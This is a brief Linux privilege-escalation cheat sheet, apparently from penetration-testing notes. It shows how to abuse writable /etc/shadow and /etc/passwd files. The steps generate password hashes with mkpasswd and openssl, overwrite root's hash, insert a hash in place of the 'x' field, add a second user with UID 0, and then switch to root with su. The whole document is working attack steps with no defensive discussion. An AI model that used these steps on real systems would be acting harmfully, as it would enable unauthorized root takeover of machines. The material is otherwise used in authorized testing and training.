# Weak Files Permissions

## Writable `/etc/shadow`

```bash
# In local machine generate new sha512 hash
mkpasswd -m sha-512 newpassword

Edit the victim /etc/shadow file and replace the root password hash
(everything between the first and second double colon : xxxxxx:)
```

## Writable `/etc/passwd`

### a) Generate a new password

```bash
# In local machine generate new sha512 hash
openssl passwd newpassword

Edit the victim /etc/passwd file and replace the X in root with the password hash
(The X instruct the computer to look in the shadow file for the hash password.)

From: root:x:0:0:root:/bin/bash
To: root:2EF5HRnQdTg/s:0:0:root:/bin/bash

Change user and use the new password:
su
```

### b) Generate a new root user

```bash
Copy the root user line in /etc/passwd
root:2EF5HRnQdTg/s:0:0:root:/bin/bash

Paste in the bottom with a different username
newroot:2EF5HRnQdTg/s:0:0:root:/bin/bash

Change user and use the new password
$ su newroot
```